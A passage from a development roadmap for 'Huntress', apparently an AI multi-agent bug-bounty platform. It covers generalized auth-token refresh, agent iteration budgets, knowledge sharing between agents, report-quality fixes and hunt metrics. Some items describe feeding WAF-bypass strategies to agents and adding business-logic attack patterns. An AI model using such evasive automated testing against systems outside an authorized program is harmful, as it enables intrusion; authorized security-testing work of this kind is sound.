| Hunt survives 30+ minutes with auth | Full hunt on Telegram target maintains authenticated access throughout |
| Proactive refresh prevents any 401s | Zero 401 responses in a hunt with working initData |
| No auth data in localStorage | initData stored only in secure_storage.rs |
| Wizard captures initData | Telegram wizard step includes initData paste field |

#### What This Enables

- **Hunt #10 against Wallet on Telegram**: Agents can test all 50+ authenticated API endpoints (withdrawals, transactions, giveaways, IDOR, etc.)
- **Any Telegram Mini App target**: The system works for all Telegram WebApp programs on HackerOne
- **Generic token refresh**: The 401 → retry pattern works for any auth type, not just Telegram
- **Multi-hour hunts**: No more 10-minute auth cliff. Budget is spent on testing, not on agents hitting 401 walls.

---

### S8: Generalize Token Refresh Beyond Telegram (Auth Refresh for All Bounties)

- [x] **Status:** COMPLETE (Session 17, April 10, 2026)
- **Priority:** HIGH (blocks authenticated hunting on any non-Telegram target with expiring tokens)
- **Effort:** ~3 hours actual
- **Depends on:** S7 (COMPLETE)
- **Files (modified):** `src/core/auth/token_refresher.ts`, `src/core/auth/session_manager.ts`, `src/components/AuthWizardModal.tsx`, `src/contexts/SettingsContext.tsx`, `src/contexts/HuntSessionContext.tsx`, `src/tests/s7_token_refresh.test.ts`
- **Files (new):** none — clean refactor of existing
- **Result:** RefreshConfig discriminated union (4 types), 15 new tests (1704 total), zero S7 regressions, AuthWizardModal shows refresh config for all auth types

#### Problem

S7 (Session 16) built a three-layer token lifecycle system (proactive, reactive, fallback), but the refresh mechanism is hardwired to Telegram's initData re-exchange pattern. The `TokenRefresher` only knows how to POST `{initData}` to an auth endpoint — it cannot handle OAuth2 `refresh_token` flows, generic JWT refresh endpoints, or cookie session renewal. Bearer tokens are explicitly marked as non-refreshable in `SessionManager.refreshSession()`.

This means:
- **Standard REST APIs with JWT + refresh_token**: bearer tokens expire and can't refresh
- **OAuth2 SPAs (authorization_code + PKCE)**: no token exchange flow exists
- **SAML enterprise apps**: detected by AuthDetector but no refresh mechanism
- **Cookie sessions**: re-login works via stored credentials, but only for form login

**What works generically today (no changes needed):**
- Session creation (all 4 types), auth injection (`applyToRequest`), 401 auto-retry, proactive refresh check (if `expiresAt` is set), JWT exp parsing, rate limiting, auth detection wizard

**What's Telegram-locked (needs generalization):**
1. `TelegramAuthData` interface → should become generic `RefreshConfig` with union types for different auth patterns
2. `refreshTelegramTokens()` → should become `refreshTokens()` that dispatches by refresh type (initData, refresh_token, re-login, custom endpoint)
3. `hasTelegramAuthData` flag → should become `hasRefreshConfig?: boolean` (or just check if refresh data exists)
4. `storedTelegramData` map → should become `storedRefreshConfigs` map
5. `_telegramInitData`/`_telegramAuthEndpoint`/`_telegramDeviceSerial` credential keys → should use generic keys
6. AuthWizardModal initData section → should be generic "Advanced: Configure Token Refresh" visible for all auth types, not just when Telegram detected
7. `expired_initdata` error type → should become `expired_credentials` (generic)

#### Solution: Generic RefreshConfig

Replace `TelegramAuthData` with a discriminated union:

```typescript
type RefreshConfig =
  | { type: 'initdata_exchange'; initData: string; authEndpointUrl: string; deviceSerial: string; tokenTtlSeconds: number; tokenHeaderMap: Record<string, string>; }
  | { type: 'refresh_token'; refreshToken: string; tokenEndpoint: string; clientId?: string; clientSecret?: string; scope?: string; tokenTtlSeconds: number; }
  | { type: 'custom_endpoint'; refreshEndpoint: string; method: 'GET' | 'POST'; headers?: Record<string, string>; body?: string; tokenHeaderMap: Record<string, string>; tokenTtlSeconds: number; }
  | { type: 're_login'; /* uses storedCredentials from SessionManager */ };
```

`TokenRefresher.refreshTokens()` dispatches by `config.type`:
- `initdata_exchange`: existing Telegram logic (unchanged)
- `refresh_token`: POST `grant_type=refresh_token&refresh_token=X` to `tokenEndpoint`
- `custom_endpoint`: POST/GET to any URL with configurable headers/body, map response to headers
- `re_login`: delegate to `SessionManager.login()` with stored credentials

AuthWizardModal shows "Advanced: Configure Token Refresh" for ALL auth types when the user wants auto-refresh, not just Telegram.

#### Acceptance Criteria

| Requirement | How to Verify |
|-------------|--------------|
| OAuth2 refresh_token flow works | Mock OAuth2 token endpoint → refresh_token exchange returns new access_token |
| Custom endpoint refresh works | Mock `/auth/refresh` endpoint → returns new JWT |
| Telegram initData still works | Existing S7 tests still pass (no regression) |
| Bearer tokens can now refresh | Bearer profile with refresh config → auto-refresh on 401 |
| AuthWizardModal shows refresh UI for all types | Select "bearer" type → "Advanced: Configure Token Refresh" section visible |
| Generic error types | `expired_initdata` replaced with `expired_credentials` |
| All existing S7 tests pass | Zero regressions in `s7_token_refresh.test.ts` |

---

## Tier 3: Overall Program Improvements

These items make Huntress more competitive, more reliable, and better at finding vulnerabilities. None block a first live hunt, but they improve the quality of results and the platform's long-term viability. Work these in priority order after the first successful H1 submission.

---

### I1: Adaptive Iteration Budget for Agents (H18)

- [x] **Effort:** 1 hour actual | **Files:** `react_loop.ts`, `cost_router.ts`, all 27 agents
- **What:** Replaced hard 80-iteration cap with adaptive budgets: 30 simple, 80 moderate, 120 complex. Added `getIterationBudget()` to `cost_router.ts`, `agentType` parameter to `ReactLoopConfig`, updated all 27 agents to use adaptive budget. **COMPLETE (Session 17)**

### I2: Encrypt localStorage Session Data (H20)

- [ ] **Effort:** 2-3 hours | **Files:** `HuntSessionContext.tsx`
- **What:** Hunt session data (finding titles, targets, agent status) is stored unencrypted in localStorage. Encrypt using the existing `secure_storage.rs` vault key via Tauri IPC. This closes an information disclosure vector if someone has access to the browser profile.

### I3: Wire ScopeImporter H1 Import (H7)

- [x] **Effort:** 2 hours | **Files:** `ScopeImporter.tsx`, `GuidelinesImporter.tsx` | **DONE (Session 20)**
- **What:** Wired H1 import: `extractH1Handle` (URL/handle parsing), `fetchH1Scope` (Tauri IPC → scope entries), error handling, URL+handle input. 15 tests. 1,779→1,794 TS tests.

### I4: Configurable Proxy Health Check URL (H6)

- [x] **Effort:** 30 min | **Files:** `proxy_pool.rs` | **DONE (Session 18)**
- **What:** Added `health_check_url` field with default, setter method, replaced hardcoded URL. 1 test added. 98→101 Rust tests.

### I5: File Size Limits on Read Operations (H10)

- [x] **Effort:** 30 min | **Files:** `lib.rs` | **DONE (Session 18)**
- **What:** Added `MAX_FILE_READ_SIZE` (10MB), metadata check before all 3 file-read commands. 3 tests added.

### I6: Update Stale Roadmap Entries

- [x] **Effort:** 30 min | **Files:** `PRODUCTION_ROADMAP.md` | **DONE (Session 18)**
- **What:** Updated 7 stale entries reflecting Sessions 8-17 work. Originally:
  - XBOW comparison table (line 590): "No API schema import" → done (Session 8)
  - Section 9: "Finding Validation = STUB" → WORKING (Phase 3)
  - Section 9: "Evasion & Stealth = PARTIAL" → WORKING (Phase 2)
  - Section 8.1: Build Dockerfile → done (Session 8)
  - Section 12 Pre-Phase 5 checklist: several unchecked items that are actually done

### I7: Cross-Agent Knowledge Sharing (Phase 6.1)

- [x] **Effort:** 8-12 hours | **Files:** `blackboard.ts`, `orchestrator_engine.ts` — **COMPLETED Session 19**
- **What:** Automatically enrich the Blackboard with all findings so agents inform each other. SQLi agent sees IDOR findings and tests injection through the IDOR endpoint. This is where higher-bounty multi-step chains originate.
- **Delivered:** SharedFinding type, Blackboard→AgentTask transform (max 10, priority-sorted), ReactLoop system prompt injection, all 27 agents wired, 17 tests.

### I8: Feed WAF Detection to Agents (Phase 6.3)

- [x] **Effort:** 4-6 hours | **Files:** Agent system prompts, `orchestrator_engine.ts` — **COMPLETED Session 19**
- **What:** WAF detection data exists but isn't passed to agents. When Cloudflare is detected, agents should automatically use WAF-bypass encoding. When rate limiting kicks in, agents should rotate techniques.
- **Delivered:** WafContext type, 5 vendor-specific bypass strategy prompts, dynamic per-domain detection from HttpClient + static fallback, all 27 agents wired, 18 tests.

### I9: Business Logic Agent Enhancement (Phase 6.4)

- [ ] **Effort:** 4-6 hours | **Files:** Business logic hunter agent
- **What:** Add test patterns for price manipulation (negative quantities, zero-cost items), workflow bypass (skip payment, skip MFA), and race conditions. Juice Shop has known business logic flaws the current agent doesn't find.

### I10: XBOW Benchmark Runner (Phase 7)

- [ ] **Effort:** 8-12 hours | **Files:** New `benchmark/` infrastructure
- **What:** Build a harness to run the XBOW 104-challenge validation benchmark. Map challenges to Huntress agents, collect pass/fail rates, establish a baseline score for tracking improvement.

---

## CRITICAL: Report Quality Upgrade (Blocks First Submission)

Identified in Session 12 audit. The platform can find vulnerabilities but generates reports that HackerOne triagers reject. This must be fixed before Hunt #8 or any submission attempt.

### What H1 Triagers Need vs What We Generate

| Requirement | Current State | Priority |
|-------------|---------------|----------|
| HTTP request/response pairs as code blocks | Not present — description text only | **Critical** |
| Executable curl/Python PoC commands | Generic "send a request" steps | **Critical** |
| "Expected vs Actual Behavior" section | Not present in templates | **High** |
| Embedded evidence (not file path references) | `compileProof()` copies paths only | **High** |
| "Prerequisites" section (auth/tools needed) | Not present in templates | **Medium** |
| "Affected Scope" (all users? admins?) | Not present | **Medium** |
| Remediation advice | Not present | **Low** |

### Files Requiring Changes

| File | What to Fix |
|------|------------|
| `src/core/reporting/poc_generator.ts` | `compileProof()` must embed evidence, not reference file paths. Add HTTP req/resp extraction from agent evidence. |
| `src/core/reporting/templates.ts` | Add "Expected vs Actual", "Prerequisites", "Affected Scope" sections to all 10 templates. Add structured PoC format guidance. |
| `src/core/reporting/report_quality.ts` | Recalibrate scoring against H1 standards: penalize missing HTTP pairs, reward executable PoCs, validate evidence depth not just presence. |
| `src/core/engine/react_loop.ts` | Agents already capture HTTP interactions — extract and structure them for the report pipeline. |
| `src/core/orchestrator/orchestrator_engine.ts` | Pass structured HTTP evidence from agent results to the report generator. |

### Acceptance Criteria

- Generated reports include at least 1 HTTP request/response pair as a code block
- Reports include an "Expected vs Actual" section
- Reports include executable reproduction steps (curl or Python)
- `compileProof()` embeds evidence content, not file paths
- Report quality scorer penalizes missing HTTP pairs (score < 60% without them)
- Manual review of 3 generated reports confirms they meet H1 triage bar

---

## Execution Order Summary

```
Session 9:  M1-M4 ✅ COMPLETE (training allowlist, PTY writer, live H1 test, hunt #6)
Session 10: Hunt #7 ✅ COMPLETE (first real H1 hunt, 7 bugs discovered)
Session 11: H21-H27 ✅ COMPLETE (all 7 bugs fixed, 62 new tests, score 7.5→8.5)
Session 12: S5,S1,S2,S3 ✅ COMPLETE (4/5 Tier 2, 48 new tests, score 8.5→9.0*)
            *Score revised to 7.5 after honest audit — report quality is the real blocker
Session 13: RQ1-RQ6 ✅ COMPLETE (report quality upgrade, 93 new tests, 1586 total)
            Hunt #8 attempt: auth wall on Wallet on Telegram — $4 burned, 0 findings
Session 14: S4 ✅ COMPLETE (auth context management, 25 new tests, 1611 total)
            Tier 2 FULLY COMPLETE. Auth Wizard (S6) designed for Session 15.
Session 15: S6 ✅ COMPLETE (auth detection wizard, 37 new tests, 1648 total)
            Hunt #9: Auth wizard worked, recon found 50+ endpoints, host header
            injection found. BUT tokens expired at 10 min — 112 agents hit 401 wall.
            S7 (Token Refresh) designed for Session 16.
Session 16: S7 ✅ COMPLETE (token refresh — Telegram-specific, 41 new tests, 1689 total)
            Three-layer defense: proactive (90s threshold), reactive (401 auto-retry), fallback (hunt pause)
Session 17: S8 ✅ COMPLETE (generalize token refresh, 15 new tests, 1704 total)
            RefreshConfig union: initdata_exchange, refresh_token, custom_endpoint, re_login
            AuthWizardModal shows refresh config for all auth types, zero S7 regressions
Session 18: Hunt #10 with persistent auth → I1-I10 (improvements)
```

## Metrics — How We Know It's Working

After completing the report quality upgrade and running Hunt #8, evaluate against these targets:

| Metric | Target | Hunt #7 Actual | How to Measure |
|--------|--------|----------------|----------------|
| False positive rate | < 30% | 69% | `findings.falsePositives / findings.total` |
| Findings submittable to H1 | > 50% | 6% (1/16) | Manual review of generated reports |
| Cost per submittable finding | < $15 | $47 | `totalCostUsd / submittableFindings` |
| Recon success rate | > 80% | 0% | Recon agents with findings / recon agents dispatched |
| Validation success rate | > 50% | 0% | Findings with confirmed status / total findings |
| Out-of-scope incidents | 0 | 0 | `safety.outOfScopeAttempts` |
| Hunt completion rate | > 95% | 95.8% | `agentsCompleted / agentsDispatched` |
| Report quality score | > 70% | Not measured | Report quality scorer on generated reports |

Use `evaluateMetrics()` from `src/core/orchestrator/hunt_metrics.ts` to compute these automatically and `formatMetricsReport()` to generate the markdown summary.

---

*This document is consumed by CONTINUATION_PROMPT.md. Session 13 should focus on report quality upgrade first, then validation hunt.*
